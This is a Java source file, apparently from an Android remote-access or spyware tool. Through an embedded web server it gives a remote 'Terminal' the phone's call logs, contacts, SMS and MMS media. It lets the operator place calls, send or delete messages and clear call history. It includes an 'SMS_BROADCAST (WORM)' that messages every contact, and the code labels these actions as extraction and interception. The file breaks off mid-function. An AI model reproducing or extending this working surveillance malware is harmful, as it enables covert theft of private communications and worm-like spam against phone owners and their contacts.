package com.labs.labrats.modules;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MmsSender;
import com.labs.labrats.SystemAnalytics;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class CommsModule extends BaseModule {

    public CommsModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/calls")) {
            return serveCallLogs(params, session);
        } else if (uri.equals("/calls/make")) {
            return makeCall(params);
        } else if (uri.equals("/calls/delete")) {
            return deleteCall(params);
        } else if (uri.equals("/calls/clear")) {
            return serveCallLogsClear();
        } else if (uri.equals("/sms")) {
            return serveSmsMessages(params, session);
        } else if (uri.equals("/sms/delete")) {
            return deleteSms(params);
        } else if (uri.equals("/sms/send")) {
            return sendSms(params);
        } else if (uri.equals("/sms/broadcast")) {
            return serveSmsBroadcast(params, session);
        } else if (uri.equals("/mms")) {
            return serveMmsMessages(params, session);
        } else if (uri.equals("/mms/delete")) {
            return deleteMms(params);
        } else if (uri.equals("/mms/send")) {
            return sendMms(session);
        } else if (uri.startsWith("/mms/media/")) {
            return serveMmsMedia(uri.substring(11));
        } else if (uri.equals("/contacts")) {
            return serveContacts(params, session);
        }
        return null;
    }

    private Response serveCallLogs(Map<String, String> params, IHTTPSession session) {
        FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128222; REMOTE_DIALER</div>");
        html.append("<form action=\"/calls/make\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">INITIATE CALL</button>");
        html.append("</div>");
        html.append("</div></form>");
        
        html.append("<div style=\"margin-top: 20px; text-align: center;\">");
        html.append("</div></div>");

        html.append("<div style=\"margin-top: 40px;\">");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(getFooter());
                return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.toString().getBytes()), html.toString().length());
            }
        }

        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1) page = 1;
            }
        } catch (Exception e) { page = 1; }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px; font-size: 0.7rem;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"margin-top: 30px;\">");
                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th><th>Action</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;

                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In"; typeClass = "call-incoming"; break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out"; typeClass = "call-outgoing"; break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed"; typeClass = "call-missed"; break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected"; typeClass = "call-missed"; break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked"; typeClass = "call-missed"; break;
                        default:
                            typeIcon = "&#128222; Other"; typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\" style=\"font-size:0.75rem;\">").append(typeIcon).append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(
                            new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(FirebaseConfig.formatDuration(duration)).append("</td>");
                    html.append("<td style=\"white-space: nowrap;\">");
                    if (number != null && !number.equals("Unknown")) {
                        html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 60px; padding: 5px 10px; margin: 0; font-size:0.6rem;\">CALL</a>");
                    }
                    html.append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=1\">First</a>");
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");
                    html.append("</div>");
                }
            } else {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) cursor.close();
        }

        html.append("</div>"); 
        html.append("</div>"); 
        html.append(getFooter());

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params, IHTTPSession session) {
        FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div style=\"margin-top: 20px;\">");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(getFooter());
                return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.toString().getBytes()), html.toString().length());
            }
        }

        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1) page = 1;
            }
        } catch (Exception e) { page = 1; }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                java.util.Map<String, String> uniqueContacts = new java.util.LinkedHashMap<>();
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    if (number == null) continue;
                    String normalized = number.replaceAll("[^0-9+]", "");
                    if (!uniqueContacts.containsKey(normalized)) {
                        uniqueContacts.put(normalized, name);
                    }
                }

                int totalCount = uniqueContacts.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px; font-size: 0.7rem;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"margin-top: 30px;\">");
                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th><th>Action</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int itemIndex = 0;

                for (java.util.Map.Entry<String, String> entry : uniqueContacts.entrySet()) {
                    if (itemIndex < offset) { itemIndex++; continue; }
                    if (count >= limit) break;

                    String number = entry.getKey();
                    String name = entry.getValue();

                    html.append("<tr><td style=\"font-size:0.75rem;\">");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(number).append("</td>");
                    html.append("<td>");
                    html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px; font-size:0.6rem;\">CALL</a>");
                    html.append("</td>");
                    html.append("</tr>");

                    count++;
                    itemIndex++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=1\">First</a>");
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");
                    html.append("</div>");
                }
            } else {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) cursor.close();
        }

        html.append("</div>"); 
        html.append("</div>"); 
        html.append(getFooter());

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveSmsMessages(Map<String, String> params, IHTTPSession session) {
        FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
        html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128231; DISPATCH_NEW_SMS</div>");
        html.append("<form action=\"/sms/send\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">ENCRYPT & SEND</button>");
        html.append("</div>");
        html.append("</div></form>");

        html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-orange); font-size: 0.7rem; margin-bottom: 15px;\">&#9889; SMS_BROADCAST (WORM)</div>");
        html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
        html.append("<form action=\"/sms/broadcast\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<textarea name=\"message\" placeholder=\"Broadcast Content\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-orange); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); width: 100% !important; max-width: 280px !important; margin: 0 auto !important; font-size: 0.8rem; height: 50px; white-space: normal; line-height: 1.2;\">EXECUTE_BROADCAST</button>");
        html.append("</div>");
        html.append("</div></form></div></div>");

        html.append("<div style=\"margin-top: 40px;\">");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(getFooter());
                return server.serveGzippedProxy(session, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 50;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Uri smsUri = Uri.parse("content://sms/");
            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px; font-size:0.7rem;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
                int count = 0, skipped = 0;
                Map<String, String> contactCache = new HashMap<>();
                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;
                    String address = cursor.getString(1); String body = cursor.getString(2);
                    long date = cursor.getLong(3); int type = cursor.getInt(4);
                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\" style=\"font-size:0.75rem;\">").append(typeLabel).append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(escapeHtml(displayName)).append("</td>");
                    html.append("<td style=\"max-width: 400px; word-wrap: break-word; font-size:0.75rem;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(formatMessageDate(date)).append("</td></tr>");
                    count++;
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/sms?page=1\">First</a>");
                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");
                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form></div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveMmsMessages(Map<String, String> params, IHTTPSession session) {
        FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
        
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128247; DISPATCH_NEW_MMS</div>");
        html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"display: flex; align-items: center; gap: 10px; justify-content: center;\">");
        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media (Max 1MB):</span>");
        html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
        html.append("</div>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">UPLOAD & DISPATCH</button>");
        html.append("</div>");
        html.append("</div></form></div>");

        html.append("<div style=\"margin-top: 40px;\">");

        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(getFooter());
            return server.serveGzippedProxy(session, "text/html", html.toString());
        }
        int page = 1; int limit = 20;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception ignored) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Set<String> mmsWithMedia = getMmsIdsWithMedia();
            Uri mmsUri = Uri.parse("content://mms/");
            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                List<String[]> mmsList = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String mmsId = cursor.getString(0);
                    if (mmsWithMedia.contains(mmsId)) {
                        mmsList.add(new String[]{
                            mmsId, 
                            String.valueOf(cursor.getLong(1) * 1000), 
                            String.valueOf(cursor.getInt(2))
                        });
                    }
                }

                int totalCount = mmsList.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px; font-size:0.7rem;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
                
                Map<String, String> contactCache = new HashMap<>();
                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                    String[] mData = mmsList.get(i);
                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
                    int msgBox = Integer.parseInt(mData[2]);
                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\" style=\"font-size:0.75rem;\">").append(typeLabel).append("</td>");
                    html.append("<td style=\"font-size:0.75rem;\">").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px; font-size:0.75rem;\">");
                    for (String part : parts) {
                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                        else if (part.startsWith("image:")) {
                            html.append("<img src=\"/mms/media/").append(part.substring(6))
                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
                        } else if (part.startsWith("video:")) {
                            html.append("<div style=\"margin-top:10px;\"><video controls preload=\"metadata\" style=\"max-width: 250px; border: 1px solid var(--neon-green); border-radius:4px;\">")
                                .append("<source src=\"/mms/media/").append(part.substring(6)).append("\">")
                                .append("Your browser does not support the video tag.")
                                .append("</video></div>")
                                .append("<div style=\"margin-top:5px;\"><a href=\"/mms/media/").append(part.substring(6)).append("\" target=\"_blank\" class=\"btn btn-small\" style=\"font-size:0.6rem; border-color:var(--neon-cyan); color:var(--neon-cyan);\">DOWNLOAD_VIDEO</a></div>");
                        }
                    }
                    html.append("</td><td style=\"font-size:0.75rem;\">").append(formatMessageDate(date)).append("</td></tr>");
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/mms?page=1\">First</a>");
                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
